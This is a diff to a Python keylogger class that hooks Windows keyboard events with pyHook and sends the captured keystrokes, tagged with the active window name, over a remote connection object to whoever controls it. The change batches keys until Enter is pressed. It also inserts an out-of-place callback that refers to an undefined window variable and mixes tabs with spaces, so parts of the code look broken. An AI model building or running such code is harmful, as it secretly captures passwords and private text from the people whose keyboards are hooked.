@@ -19,12 +19,18 @@ class Keylog(threading.Thread):
     print 'Injected:', event.Injected
     print 'Transition', event.Transition
     print '---'
-
+	
+    
+    def is_active_changed(window, param):
+        print window.props.is_active
+    
+    window.connect('notify::is-active', is_active_changed)
+    
     self.message += chr(event.Ascii).__str__()
     
-    #if not self.e.wait():
-    #  print "unset"
-    #  self.e.clear()
+    if not self.e.wait():
+      print "unset"
+      self.e.clear()
     
     #self.conn.modules.sys.stdout.write("test")
     #ctypes.windll.user32.PostQuitMessage(0)
@@ -35,25 +41,32 @@ class Keylog(threading.Thread):
       ctypes.windll.user32.PostQuitMessage(0)
       return False
     
-    t1 = threading.Thread(name='keylog_output_thread', target=self.output, args=(self.message + "\n",) )
-    t1.start()
+    #If <ENTER> Key is pressed...
+    if int(event.Ascii) == 13:
+        
+        message_header = "=" * 60 + "\n"
+        message_header += "WINDOW NAME : " + event.WindowName + "\n"
+        message_header += "=" * 60 + "\n"
+        t1 = threading.Thread(name='keylog_output_thread', target=self.output, args=(message_header + "Keys: " + self.message, ) )
+        self.message = "" # Clear Message out
+        t1.start()
     
     return True
     
   def output(self,message):
-    self.conn.modules.sys.stdout.write(message)
+    self.conn.modules.sys.stdout.write(message + "\n",)
     
   def __init__(self,conn):
     threading.Thread.__init__(self)
     self.conn = conn
-    #self.message = "Keyload Thread Started\n"
+    self.message = ""
     return 
   
   def run(self):
     hm = pyHook.HookManager()
     hm.KeyDown = self.OnKeyboardEvent
     hm.HookKeyboard()
-    self.conn.modules.sys.stdout.write("Key Logger Started\n")
+
     
     self.e = threading.Event()
 
